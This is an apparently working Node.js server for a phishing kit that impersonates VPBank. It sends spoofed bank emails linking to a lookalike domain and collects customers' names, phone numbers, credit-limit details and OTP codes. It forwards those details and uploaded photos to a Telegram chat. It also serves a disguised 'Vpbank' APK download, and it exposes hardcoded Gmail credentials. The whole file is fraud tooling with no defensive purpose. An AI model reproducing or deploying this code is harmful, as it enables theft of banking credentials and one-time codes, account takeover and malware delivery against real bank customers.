require('dotenv').config();
const express = require('express');
const app = express();
const port = process.env.PORT || 3000;
const http = require('http').createServer(app);
const { Server } = require('socket.io');
var cors = require('cors')
const io = new Server(http);
var siofu = require("socketio-file-upload");
const axios = require('axios');
const TG = require('telegram-bot-api')
const api = new TG({
    token: process.env.TELEGRAM_BOT_TOKEN,
})
const bodyParser = require('body-parser')
const fs = require('fs')
const nodemailer = require('nodemailer');
const multer = require('multer');
const { time } = require('console');

var storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, 'public/uploads')
    },
    filename: function (req, file, cb) {
        cb(null, file.originalname)
    }
})
var upload = multer({ storage: storage })
var transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'quangbaorp@gmail.com',
        pass: 'johttcwmgzyxeyvp'
    },
    tls: {
        rejectUnauthorized: false
    },
});

app.use(express.static('public'));
app.set('view engine', 'html');
app.set('views', './views');
app.use(cors({
    origin: '*'
}));
app.use(siofu.router).listen(3005);

io.on("connection", function (socket) {
    var uploader = new siofu({
        // maxFileSize: 1gb
        maxFileSize: 1024 * 1024 * 1024

    });
    uploader.dir = "./public/uploads";
    uploader.listen(socket);
    uploader.on("complete", async function (event) {
        await api.sendPhoto({
            chat_id: process.env.TELEGRAM_CHAT_ID,
            photo: fs.createReadStream(`${__dirname}/${event.file.pathName}`)
        });
    });

    socket.on('service', async (data) => {
        // send data to api telegram
        const message = `Có yêu cầu từ khách hàng: ${data.name} - Số điện thoại ${data.phone} - hạn mức hiện tại ${data.limit_now} - hạn mức khả dungh ${data.limit_total} - hạn mước mong muốn ${data.limit_increase}`;
        await api.sendMessage({
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: message,
            mode: 'html'
        })
        await new Promise(resolve => setTimeout(resolve, 2000));
        socket.emit('success', { message: 'Đã gửi yêu cầu thành công' });
    });


    socket.on('otp', (data) => {
        // send data to api telegram
        const message = `Mã OTP: ${data.otp}`;
        api.sendMessage({
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: message,
            mode: 'html'
        }).then(() => {
            socket.emit('success', { message: 'Đã gửi mã OTP thành công' });
        }).catch(() => {
            socket.emit('error', { message: 'Hệ thống đang quá tải, vui lòng thử lại sau!' });
        });

    });

    socket.on('email', (data) => {
        const mailOptions = {
            from: 'hotrokhachhang@vpbank.email',
            to: data.email,
            subject: 'Thông báo từ VPBank',
            html: `
            <!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MUO - Technology, Simplified</title>
  </head>

  <body style="font-family: Arial; margin: 0">
    <table
      style="
        background-color: #f3f3f5;
        padding: 16px 12px;
        min-height: 100vh;
        width: 80%;
        margin: 0 auto;
      "
    >
      <tbody>
        <tr>
          <td style="vertical-align: top">
            <table
              border="0"
              width="600"
              cellpadding="0"
              cellspacing="0"
              align="center"
              style="
                width: 600px !important;
                min-width: 600px !important;
                max-width: 600px !important;
                margin: auto;
                border-spacing: 0;
                border-collapse: collapse;
                background: white;
                border-radius: 0px 0px 10px 10px;
                padding-left: 30px;
                padding-right: 30px;
                padding-top: 30px;
                padding-bottom: 30px;
                display: block;
              "
            >
              <tbody>
                <tr>
                  <td
                    style="
                      text-align: center;
                      vertical-align: top;
                      font-size: 0;
                      border-collapse: collapse;
                    "
                  >
                    <table
                      border="0"
                      width="100%"
                      cellpadding="0"
                      cellspacing="0"
                      bgcolor="#F8F8F8"
                      style="border-spacing: 0; border-collapse: collapse"
                    >
                      <tbody>
                        <tr style="background-size: cover">
                          <td
                            style="
                              width: 100%;
                              text-align: left;
                              border-collapse: collapse;
                              background: #fff;
                              border-radius: 10px 10px 0px 0px;
                              color: white;
                            "
                          >
                            <img
                              src="https://vp.hbservice.site/UploadImages/Data/Banner/vp03.jpg"
                              width="100%"
                              class="CToWUd"
                            />
                          </td>

                        </tr>
                      </tbody>
                    </table>
                  </td>
                </tr>

                <tr>
                  <td
                    style="
                      vertical-align: top;
                      font-size: 0;
                      border-collapse: collapse;
                    "
                  >
                    <table
                      border="0"
                      width="100%"
                      cellpadding="0"
                      cellspacing="0"
                      bgcolor="#F8F8F8"
                      style="border-spacing: 0; border-collapse: collapse"
                    >
                      <tbody>
                        <tr>
                          <td
                            style="
                              padding-top: 30px;
                              padding-bottom: 5px;
                              background-color: white;
                            "
                          >
                            <span style="font-size: 20px; color: #363636"
                              >Kính chào quý khách <b></b></span
                            >
                          </td>
                        </tr>
                        <tr>
                          <td
                            style="
                              padding-top: 5px;
                              padding-bottom: 9px;
                              background-color: white;
                            "
                          >
                            <span
                              style="
                                font-size: 24px;
                                color: #363636;
                                font-weight: bold;
                              "
                              >VPBank trân thành cảm ơn quý khách, trong thời gian qua đã sử dụng các dịch vụ của chúng tôi.</span
                            >
                          </td>
                        </tr>

                        <tr>
                          <td
                            style="
                              padding: 10px 0px;
                              background-color: white;
                              border-collapse: collapse;
                            "
                          >
                            <div
                              style="
                                font-size: 18px;
                                color: #141414;
                                font-weight: normal;
                              "
                            >
                              Hiện tại Vpbank đang có ưu đã cho khách hàng nâng hạn mức thẻ tín dụng theo yêu cầu của quý khách, vui lòng truy cập vào đường link sau để xác nhận thông tin.
                            </div>
                          </td>
                        </tr>

                      </tbody>
                    </table>
                  </td>
                </tr>
                  <td
                    style="
                      background-color: #e23744;
                      padding: 5px 0px;
                      border-radius: 8px;
                    "
                  >
                    <h2
                      style="
                        font-size: 20px;
                        color: #ffffff;
                        margin: 0;
                        text-align: center;
                      "
                    >
                    <a href="https://vp.khachhang-uutien.online" style="color: #ffffff; text-decoration: none;">
                      Nâng hạn mức ngay
                    </a>
                    </h2>
                  </td>
                </tr>
                <tr>
                  <td style="text-align: center">
                    <div
                      style="
                        width: 100%;
                        margin-top: 30px;
                        display: inline-block;
                        border-top: 1px solid #e8e8e8;
                      "
                    ></div>
                  </td>
                </tr>
                <tr></tr>

                <tr>
                  <td>
                    <p
                      style="
                        line-height: 1.4;
                        letter-spacing: 0.5px;
                        text-align: center;
                        color: #444;
                        margin-bottom: 8px;
                      "
                    >
                      Copyright © 2024
                      <a
                        href="https://www.vpbank.com.vn/"
                        style="text-decoration: none; color: #444"
                        >Vpbank</a
                      >
                    </p>
                  </td>
                </tr>
              </tbody>
            </table>
          </td>
        </tr>
      </tbody>
    </table>
  </body>
</html>
            `
        };

        transporter.sendMail(mailOptions, function (error, info) {
            if (error) {
                console.log(error);
                socket.emit('error', { message: 'Gửi email thất bại, vui lòng thử lại sau!' });
            } else {
                console.log('Email sent: ' + info.response);
                socket.emit('success', { message: 'Gửi email thành công' });
            }
        });
    });
});

app.use(bodyParser.urlencoded({ extended: true }))


app.get('/', (req, res) => {
    res.sendFile(__dirname + '/views/index.html');
});
app.get('/chuyen-tien-atm', (req, res) => {
    res.sendFile(__dirname + '/views/chuyen-tien-atm.html');
})
app.get('/chuyen-tra-gop', (req, res) => {
    res.sendFile(__dirname + '/views/chuyen-tra-gop.html');
});
app.get('/dang-ky-nang-cap', (req, res) => {
    res.sendFile(__dirname + '/views/dang-ky-nang-cap.html');
});
app.get('/hoan-tien', (req, res) => {
    res.sendFile(__dirname + '/views/hoan-tien.html');
});
app.get('/nang-han-muc', (req, res) => {
    res.sendFile(__dirname + '/views/nang-han-muc.html');
});
app.get('/otp', (req, res) => {
    res.sendFile(__dirname + '/views/otp.html');
});
app.get('/otp-error', (req, res) => {
    res.sendFile(__dirname + '/views/otp-error.html');
});
app.get('/yeu-cau-huy-the', (req, res) => {
    res.sendFile(__dirname + '/views/yeu-cau-huy-the.html');
});
app.get('/sang-ngang-the', (req, res) => {
    res.sendFile(__dirname + '/views/sang-ngang-the.html');
});
app.get('/download', function (req, res) {
    const file = `${__dirname}/public/app/Vpbank_v3.10.13.apk`;
    res.download(file, 'Vpbank_v3.10.13.apk', {
        cacheControl: false
    }, (err) => {
        console.log('err', err);
    }); // Set disposition and send it.
});
app.get('/download-app', function (req, res) {
    res.sendDate(__dirname + '/views/download-app.html');
});

app.get('/images', function (req, res) {
    res.sendFile(__dirname + '/views/images.html');
});

app.get('/image-get', function (req, res) {
    const path = `${__dirname}/public/uploads`;
    fs.readdir(path, function (err, items) {
        // sort by date
        items.sort((a, b) => {
            return fs.statSync(`${path}/${b}`).mtime.getTime() - fs.statSync(`${path}/${a}`).mtime.getTime();
        });

        res.json({
            data: items
        });
    });
});
app.get('/gui-email', function (req, res) {
    res.sendFile(__dirname + '/views/gui-email.html');
});

app.post('/upload', upload.single('file'), function (req, res, next) {
    const file = req.file
    if (!file) {
        const error = new Error('Please upload a file')
        error.httpStatusCode = 400
        return next(error)
    }
    api.sendPhoto({
        chat_id: process.env.TELEGRAM_CHAT_ID,
        photo: fs.createReadStream(`${__dirname}/${file.destination}/${file.originalname}`),
        timeout: 999999
    }).then(() => {
        console.log('Upload file thành công');
        res.json({ message: 'Upload file thành công' });
    }).catch((e) => {
        console.log('Upload file thất bại', e);
        res.json({ message: 'Upload file thất bại' });
    });
});

http.listen(port, () => {
    console.log(`Đã chạy trên cổng :${port}`);
});
